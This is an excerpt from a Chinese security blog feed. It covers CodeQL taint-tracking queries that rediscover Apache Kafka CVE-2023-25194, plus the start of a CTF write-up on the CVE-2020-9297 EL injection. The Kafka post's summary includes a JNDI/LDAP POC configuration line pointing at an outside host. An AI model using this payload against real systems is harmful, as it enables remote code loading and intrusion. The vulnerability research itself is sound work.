fromNode.asExpr()</span><br><span class="line">         and cc &#x3D; toNode.asExpr()</span><br><span class="line">         and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;AppConfigurationEntry&quot;)</span><br><span class="line">     )</span><br><span class="line">     or</span><br><span class="line">     exists(MethodAccess ma |  </span><br><span class="line">         ma.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">         and ma &#x3D; toNode.asExpr()</span><br><span class="line">         and ma.getMethod().hasName(&quot;getOptions&quot;)</span><br><span class="line">         and ma.getQualifier().getType().hasName(&quot;AppConfigurationEntry&quot;)</span><br><span class="line">     )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加以上条件，再次运行</p><p><img src="/images/pasted-615.png" alt="upload successful"></p><h4 id="6-2-5-Confuse-Only-KerberosLogin"><a href="#6-2-5-Confuse-Only-KerberosLogin" class="headerlink" title="6.2.5 Confuse: Only KerberosLogin?"></a>6.2.5 Confuse: Only KerberosLogin?</h4><p>观察路径，发现已经有到KerberosLogin configuration 的节点，但是并无到AbstractLogin的 configuration，而AbstractLogin 的configuration 就是最终的sink点。[黑人问号？？？]</p><p>继续尝试，如果把sink点条件改为以下，会发现都不是想要的</p><ul><li>LoginContext</li><li>AbstractLogin</li></ul><blockquote><p>Why？</p></blockquote><h2 id="0x07-Taint-O-Taint-O-field"><a href="#0x07-Taint-O-Taint-O-field" class="headerlink" title="0x07 Taint O != Taint O.field"></a>0x07 Taint O != Taint O.field</h2><h3 id="7-1-Simple-Demo"><a href="#7-1-Simple-Demo" class="headerlink" title="7.1 Simple Demo"></a>7.1 Simple Demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoNoneField</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String f;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setF</span><span class="params">(String f)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.f = f;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getF</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.f;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DemoNoneField</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.f = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        DemoNoneField a = <span class="keyword">new</span> DemoNoneField();</span><br><span class="line">        String tt = args[<span class="number">0</span>];</span><br><span class="line">        a.setF(tt);</span><br><span class="line">        System.out.println(a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.DataFlow</span><br><span class="line">import semmle.code.java.dataflow.TaintTracking</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class MyTaintTrackingConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    MyTaintTrackingConfig() &#123; this &#x3D; &quot;MyTaintTrackingConfig&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">        exists(Method m | </span><br><span class="line">            m.hasName(&quot;main&quot;)</span><br><span class="line">            and m.getAParameter() &#x3D; source.asParameter()</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists(MethodAccess ma |             </span><br><span class="line">            sink.asExpr() &#x3D; ma.getAnArgument()</span><br><span class="line">            and ma.getCallee().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;PrintStream&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line">from MyTaintTrackingConfig cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line">select sink, source, sink, &quot;vuln&quot;</span><br></pre></td></tr></table></figure><p>运行会发现并无结果，实际上即使给DemoNoneField加上toString，对这个codeql query结果也没有影响，因为在codeql中，Object和Object.field 属于是不同的污点。</p><h3 id="7-2-Implicit-Flow"><a href="#7-2-Implicit-Flow" class="headerlink" title="7.2 Implicit Flow"></a>7.2 Implicit Flow</h3><p>参考【4】中的解释</p><blockquote><p>隐式流：隐式流分析是分析污点标记如何随程序中变量之间的控制依赖关系传播，也就是分析污点标记如何从条件指令传播到其所控制的语句。<br>显式流：显式流分析就是分析污点标记如何随程序中变量之间的数据依赖关系传播。也就是所谓的数据流传播。</p></blockquote><p><img src="/images/pasted-618.png" alt="upload successful"></p><h3 id="7-3-CodeQL-allowImplicitRead"><a href="#7-3-CodeQL-allowImplicitRead" class="headerlink" title="7.3 CodeQL allowImplicitRead"></a>7.3 CodeQL allowImplicitRead</h3><p><code>predicate allowImplicitRead ( Node node , ContentSet c )</code></p><p>字面意思是隐式读，个人理解是用于判断节点Node及其内部属性的传播关系，和传统意义的隐式流分析还有些不一样。</p><ol><li>Node 是DataFlow::Node，数据流分析的任意节点即可</li><li>ContentSet 有以下类型<ul><li>FieldContent</li><li>ArrayContent</li><li>CollectionContent</li><li>MapKeyContent</li><li>MapValueContent</li><li>SyntheticFieldContent</li></ul></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">    super.allowImplicitRead(node, c)</span><br><span class="line">    or </span><br><span class="line">    ( </span><br><span class="line">        this.isSink(node)</span><br><span class="line">        and </span><br><span class="line">        c instanceof DataFlow::FieldContent</span><br><span class="line">        &#x2F;&#x2F; and c.(DataFlow::FieldContent).getField().hasName(&quot;f&quot;)</span><br><span class="line">        and c.(DataFlow::FieldContent).getField().getDeclaringType().hasName(&quot;DemoNoneField&quot;)</span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-619.png" alt="upload successful"></p><h2 id="0x08-Ultimate-Success"><a href="#0x08-Ultimate-Success" class="headerlink" title="0x08 Ultimate Success"></a>0x08 Ultimate Success</h2><h3 id="8-1-Apply-allowImplicitRead"><a href="#8-1-Apply-allowImplicitRead" class="headerlink" title="8.1 Apply allowImplicitRead"></a>8.1 Apply allowImplicitRead</h3><p>上一节中，codeql 对于进入KerberosLogin configure的参数污点描述如下<br>configuration : JaasConfig [configEntries, &lt;element&gt;] : AppConfigurationEntry </p><p><img src="/images/pasted-620.png" alt="upload successful"></p><p>个人理解如下：</p><ul><li>configuration：污点参数名</li><li>JaasConfig [configEntries, &lt;element&gt;]: 参数类型为JaasConfig，其Field有configEntries，是个Collection，&lt;element&gt;里面的才是污点</li><li>AppConfigurationEntry：污点的类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">    super.allowImplicitRead(node, c)</span><br><span class="line">    or</span><br><span class="line">    (</span><br><span class="line">        this.isSink(node)</span><br><span class="line">        and (</span><br><span class="line">            c instanceof DataFlow::FieldContent</span><br><span class="line">            and c.(DataFlow::FieldContent).getField().getDeclaringType().getASourceSupertype().hasName(&quot;Configuration&quot;)</span><br><span class="line">            or </span><br><span class="line">            c instanceof DataFlow::CollectionContent</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p><img src="/images/pasted-617.png" alt="upload successful"></p><blockquote><p>小疑问：实际上是两层JaasConfig.configEntries[AppConfigurationEntry]，从结果反馈来看这种写法是ok的，写法上实际只有一层，为什么可以？</p></blockquote><h3 id="8-2-Final-QL"><a href="#8-2-Final-QL" class="headerlink" title="8.2 Final QL"></a>8.2 Final QL</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * @kind path-problem</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">import java</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">private class JAASSource extends RemoteFlowSource &#123;</span><br><span class="line">    JAASSource()&#123;</span><br><span class="line">        exists( </span><br><span class="line">            Method m, Annotation a | </span><br><span class="line">            m.getAParameter() &#x3D; this.asParameter()</span><br><span class="line">            and m.getFile().getAbsolutePath().matches(&quot;%ConnectorsResource.java&quot;)</span><br><span class="line">            and a.getType().hasQualifiedName(&quot;javax.ws.rs&quot;, &quot;Path&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">    override string getSourceType() &#123; result &#x3D; &quot;jaas&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class VulConfig extends TaintTracking::Configuration &#123;</span><br><span class="line">    VulConfig() &#123; this &#x3D; &quot;jaas vul&quot; &#125;</span><br><span class="line"></span><br><span class="line">    override int fieldFlowBranchLimit() &#123; result &#x3D; 10000000 &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSource(DataFlow::Node src) &#123; src instanceof JAASSource &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">        exists( </span><br><span class="line">            ConstructorCall cc|</span><br><span class="line">            cc.getConstructor().getDeclaringType().getASupertype*().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;LoginContext&quot;)</span><br><span class="line">            and sink.asExpr() &#x3D; cc.getArgument(3)</span><br><span class="line">            and cc.getNumArgument() &#x3D; 4</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate isAdditionalTaintStep(DataFlow::Node fromNode, DataFlow::Node toNode) &#123;</span><br><span class="line">        exists(ConstructorCall cc |</span><br><span class="line">            cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">            and cc &#x3D; toNode.asExpr()</span><br><span class="line">            and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;StreamTokenizer&quot;)</span><br><span class="line">        )</span><br><span class="line">        or </span><br><span class="line">        exists(VarAccess va, ClassOrInterface ci |</span><br><span class="line">            va.getQualifier().getType().getFile() &#x3D; ci.getFile()</span><br><span class="line">            and ci.getAField().hasName(&quot;sval&quot;)</span><br><span class="line">            and ci.hasName(&quot;StreamTokenizer&quot;)</span><br><span class="line">            and va.getVariable().hasName(&quot;sval&quot;)</span><br><span class="line">            and va &#x3D; toNode.asExpr()</span><br><span class="line">            and va.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">        )</span><br><span class="line">        or </span><br><span class="line">        exists(ConstructorCall cc |</span><br><span class="line">            cc.getAnArgument() &#x3D; fromNode.asExpr()</span><br><span class="line">            and cc &#x3D; toNode.asExpr()</span><br><span class="line">            and cc.getConstructor().getDeclaringType().hasQualifiedName(&quot;javax.security.auth.login&quot;, &quot;AppConfigurationEntry&quot;)</span><br><span class="line">        )</span><br><span class="line">        or</span><br><span class="line">        exists(MethodAccess ma |  </span><br><span class="line">            ma.getQualifier() &#x3D; fromNode.asExpr()</span><br><span class="line">            and ma &#x3D; toNode.asExpr()</span><br><span class="line">            and ma.getMethod().hasName(&quot;getOptions&quot;)</span><br><span class="line">            and ma.getQualifier().getType().hasName(&quot;AppConfigurationEntry&quot;)</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    override predicate allowImplicitRead(DataFlow::Node node, DataFlow::ContentSet c) &#123;</span><br><span class="line">        super.allowImplicitRead(node, c)</span><br><span class="line">        or</span><br><span class="line">        (</span><br><span class="line">            this.isSink(node)</span><br><span class="line">            and (</span><br><span class="line">                c instanceof DataFlow::FieldContent</span><br><span class="line">                and c.(DataFlow::FieldContent).getField().getDeclaringType().getASourceSupertype().hasName(&quot;Configuration&quot;)</span><br><span class="line">                or </span><br><span class="line">                c instanceof DataFlow::CollectionContent</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from VulConfig config, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where config.hasFlowPath(source, sink)</span><br><span class="line">select sink.getNode(), source, sink, &quot;$@.&quot;, source.getNode(), &quot;user input&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-616.png" alt="upload successful"></p><h2 id="0x09-小结"><a href="#0x09-小结" class="headerlink" title="0x09 小结"></a>0x09 小结</h2><p>本文尝试使用CodeQL 回溯发现Apache Kafka CVE-2023-25194漏洞，期间遇到了一些问题，一是官方推荐的parittal flow 方式在此并不适合，还不如用Expr.getLocation().getFile()限制文件来得方便；二是隐式链的传播，这块很少有文档，除非看过参考【2】中类似l3yx师傅的案例，或者看ql源码。</p><p>CodeQL 不开源，能力有限，若有不对肯请指出，盼师傅们交流。</p><p>其实还有些遗留问题</p><ol><li>最终的污点链实际上和真实的调用栈还是有出入的</li><li>4.1.2一节中1+1!=2 也没解释</li><li>CVE-2023-25194 ??<br> <img src="/images/pasted-654.png" alt="upload successful"></li></ol><h2 id="0x10-参考"><a href="#0x10-参考" class="headerlink" title="0x10 参考"></a>0x10 参考</h2><ul><li>[1] <a href="https://codeql.github.com/docs/writing-codeql-queries/debugging-data-flow-queries-using-partial-flow/">debugging-data-flow-queries-using-partial-flow</a></li><li>[2] <a href="https://l3yx.github.io/2022/05/14/GitHub-Security-Lab-CTF-CodeQL-and-Chill/">GitHub Security Lab CTF: CodeQL and Chill (by:l3yx)</a></li><li>[3] <a href="https://www.cnblogs.com/LittleHann/p/13034079.html">漏洞挖掘场景下的污点分析技术分析 </a></li><li>[4] <a href="https://www.ceietn.org/a/mingyuanzhanshi/jishuqianyan/2023/0411/629.html">浅谈软件污点分析技术</a></li><li>[5] <a href="https://github.com/github/codeql/pull/11478">https://github.com/github/codeql/pull/11478</a></li><li>[6] <a href="https://github.com/SummerSec/BlogPapers/blob/master/2022/GitHub%20Java%20CodeQL%20CTF.md">GitHub Java CodeQL CTF (by:summersec)</a></li><li>[7] <a href="https://www.blackhat.com/us-23/briefings/schedule/#codeql-also-a-powerful-binary-analysis-engine-31995">CodeQL: Also a Powerful Binary Analysis Engine</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CVE-2023-25194 是jaas 的通用问题，如果可以自定义jaas config，就可以触发漏洞。是否能够通过自动化发现该漏洞？如果可能，那么也就可以自动化横向分析类似问题。&lt;/p&gt;
&lt;p&gt;本文假设读者师傅们已经能够简单使用codeql，比如codeql的source&#92;sink概念，以及data-flow污点分析及其isAdditionalTaintStep的使用。&lt;/p&gt;
&lt;h2 id=&quot;0x01-CVE-2023-25194&quot;&gt;&lt;a href=&quot;#0x01-CVE-2023-25194&quot; class=&quot;headerlink&quot; title=&quot;0x01 CVE-2023-25194&quot;&gt;&lt;/a&gt;0x01 CVE-2023-25194&lt;/h2&gt;&lt;p&gt;POC:&lt;br&gt;&lt;code&gt;com.sun.security.auth.module.JndiLoginModule required user.provider.url=&amp;quot;ldap://kafka2.1.dns.m0d9.me &lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CodeQL" scheme="http://m0d9.me/categories/CodeQL/"/>
    
    
    <category term="CVE" scheme="http://m0d9.me/tags/CVE/"/>
    
    <category term="CodeQL" scheme="http://m0d9.me/tags/CodeQL/"/>
    
    <category term="Kafka" scheme="http://m0d9.me/tags/Kafka/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL: GitHub Security Lab CTF</title>
    <link href="http://m0d9.me/2023/02/24/CodeQL-GitHub-Security-Lab-CTF/"/>
    <id>http://m0d9.me/2023/02/24/CodeQL-GitHub-Security-Lab-CTF/</id>
    <published>2023-02-24T09:15:00.000Z</published>
    <updated>2023-04-20T08:57:45.866Z</updated>
    
    <content type="html"><![CDATA[<p>summersec师傅的文章【1】不错，主要参考师傅的文章</p><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p><strong>GitHub Security Lab CTF</strong> </p><p>第四题：<a href="https://securitylab.github.com/ctf/codeql-and-chill/">GitHub Security Lab CTF 4: CodeQL and Chill - The Java Edition</a><br>相关漏洞：<a href="https://securitylab.github.com/advisories/GHSL-2020-028-netflix-titus/">CVE-2020-9297</a><br><a href="https://drive.google.com/open?id=10ju0t2QZjsKI8qrAqwzsPA3K-lBgqPVF">CodeQL database 下载地址</a></p><p><strong>CVE-2020-9297</strong> </p><p>祖师爷pwntester 发现的，$3000，然后被拿来出题。。。</p><p><img src="/images/pasted-424.png" alt="upload successful"></p><a id="more"></a><h2 id="0x02-CVE-2020-9297"><a href="#0x02-CVE-2020-9297" class="headerlink" title="0x02 CVE-2020-9297"></a>0x02 CVE-2020-9297</h2><p>项目在 <a href="https://github.com/Netflix/titus-control-plane/archive/refs/tags/v0.1.1-rc.263.zip">https://github.com/Netflix/titus-control-plane/archive/refs/tags/v0.1.1-rc.263.zip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/Netflix/titus-control-plane/archive/refs/tags/v0.1.1-rc.263.zip</span><br><span class="line">unzip v0.1.1-rc.263.zip</span><br><span class="line"><span class="built_in">cd</span> titus-control-plane-0.1.1-rc.263</span><br><span class="line"><span class="comment">#几个包缺失，会失败，不折腾了直接用提供的codeql db</span></span><br><span class="line"><span class="comment">#jenv local 1.8</span></span><br><span class="line"><span class="comment">#codeql database create titus_db -l java -c=&quot;./gradlew build&quot;</span></span><br></pre></td></tr></table></figure><p>题目是直接给出了Sink点：ConstraintValidatorContext.buildConstraintViolationWithTemplate</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span><span class="params">(Container container, ConstraintValidatorContext context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (container == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Set&lt;String&gt; common = <span class="keyword">new</span> HashSet&lt;&gt;(container.getSoftConstraints().keySet());</span><br><span class="line">    common.retainAll(container.getHardConstraints().keySet());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (common.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    context.buildConstraintViolationWithTemplate(</span><br><span class="line">            <span class="string">&quot;Soft and hard constraints not unique. Shared constraints: &quot;</span> + common</span><br><span class="line">    ).addConstraintViolation().disableDefaultConstraintViolation();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-JSR-380-Bean-Validation"><a href="#2-1-JSR-380-Bean-Validation" class="headerlink" title="2.1 JSR 380 Bean Validation"></a>2.1 JSR 380 Bean Validation</h3><p>Java API规范(JSR303)定义了Bean校验的标准validation-api，但没有提供实现。hibernate validation是对这个规范的实现，并增加了校验注解如@Email、@Length等。Spring Validation是对hibernate validation的二次封装，用于支持spring mvc参数自动校验。</p><p>使用Bean Validation可以简单的在需要验证的类或者属性上加上对应的注解，就可以使用内置或者自定义验证器对Bean进行验证，优势就是只需要约束一次，不用在需要验证的所有接口处加入大量的if-else 判断，方便代码维护，简化代码量。</p><p>详情可以参考【7】</p><h3 id="2-2-Bean-Stalking-Growing-Java-beans-into-RCE"><a href="#2-2-Bean-Stalking-Growing-Java-beans-into-RCE" class="headerlink" title="2.2 Bean Stalking: Growing Java beans into RCE"></a>2.2 Bean Stalking: Growing Java beans into RCE</h3><p>详情参考祖师爷pwntester 【6】的文章，结论是ConstraintValidatorContext.buildConstraintViolationWithTemplate()参数中存在注入EL注入。buildConstraintViolationWithTemplate 作用是invalid 失败时进行报错。</p><p>pwntester 祖师爷从CVE-2018-16621 开始，总结了该漏洞类型的原理，给出了CodeQL 规则，并且发现了另外的发现。</p><p><img src="/images/pasted-427.png" alt="upload successful"></p><ul><li>CVE-2018-16621 Nexus</li><li>CVE-2020-10199 Nexus</li><li>CVE-2020-10204 Nexus</li></ul><h3 id="2-3-调用链"><a href="#2-3-调用链" class="headerlink" title="2.3 调用链"></a>2.3 调用链</h3><p>参考【7】中的调用链</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">interpolate:67, ElTermResolver (org.hibernate.validator.internal.engine.messageinterpolation)</span><br><span class="line">interpolate:64, InterpolationTerm (org.hibernate.validator.internal.engine.messageinterpolation)</span><br><span class="line">interpolate:159, ResourceBundleMessageInterpolator (org.hibernate.validator.messageinterpolation)</span><br><span class="line">interpolateExpression:519, AbstractMessageInterpolator (org.hibernate.validator.messageinterpolation)</span><br><span class="line">interpolateMessage:415, AbstractMessageInterpolator (org.hibernate.validator.messageinterpolation)</span><br><span class="line">interpolate:355, AbstractMessageInterpolator (org.hibernate.validator.messageinterpolation)</span><br><span class="line">interpolate:59, MessageSourceMessageInterpolator (org.springframework.boot.validation)</span><br><span class="line">interpolate:51, LocaleContextMessageInterpolator (org.springframework.validation.beanvalidation)</span><br><span class="line">interpolate:313, AbstractValidationContext (org.hibernate.validator.internal.engine.validationcontext)</span><br><span class="line">addConstraintFailure:230, AbstractValidationContext (org.hibernate.validator.internal.engine.validationcontext)</span><br><span class="line">validateConstraints:79, ConstraintTree (org.hibernate.validator.internal.engine.constraintvalidation)</span><br><span class="line">doValidateConstraint:130, MetaConstraint (org.hibernate.validator.internal.metadata.core)</span><br><span class="line">validateConstraint:123, MetaConstraint (org.hibernate.validator.internal.metadata.core)</span><br><span class="line">validateMetaConstraint:555, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validateConstraintsForSingleDefaultGroupElement:518, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validateConstraintsForDefaultGroup:488, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validateConstraintsForCurrentGroup:450, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validateInContext:400, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validate:172, ValidatorImpl (org.hibernate.validator.internal.engine)</span><br><span class="line">validate:109, SpringValidatorAdapter (org.springframework.validation.beanvalidation)</span><br><span class="line">validate:66, ValidatorAdapter (org.springframework.boot.autoconfigure.validation)</span><br><span class="line">validate:895, DataBinder (org.springframework.validation)</span><br><span class="line">validateIfApplicable:245, AbstractMessageConverterMethodArgumentResolver (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">resolveArgument:139, RequestResponseBodyMethodProcessor (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">resolveArgument:121, HandlerMethodArgumentResolverComposite (org.springframework.web.method.support)</span><br><span class="line">getMethodArgumentValues:179, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeForRequest:146, InvocableHandlerMethod (org.springframework.web.method.support)</span><br><span class="line">invokeAndHandle:117, ServletInvocableHandlerMethod (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">invokeHandlerMethod:895, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handleInternal:808, RequestMappingHandlerAdapter (org.springframework.web.servlet.mvc.method.annotation)</span><br><span class="line">handle:87, AbstractHandlerMethodAdapter (org.springframework.web.servlet.mvc.method)</span><br><span class="line">doDispatch</span><br><span class="line">……</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>hibernate validator的8.0.0已经引入constraint_expression_language_feature_level 和custom_violation_expression_language_feature_level 进行EL表达式的限制，默认已经不能利用，具体哪个版本引入的赞未考究。</p><p><img src="/images/pasted-428.png" alt="upload successful"></p><h2 id="0x03-用CodeQL-进行漏洞分析"><a href="#0x03-用CodeQL-进行漏洞分析" class="headerlink" title="0x03 用CodeQL 进行漏洞分析"></a>0x03 用CodeQL 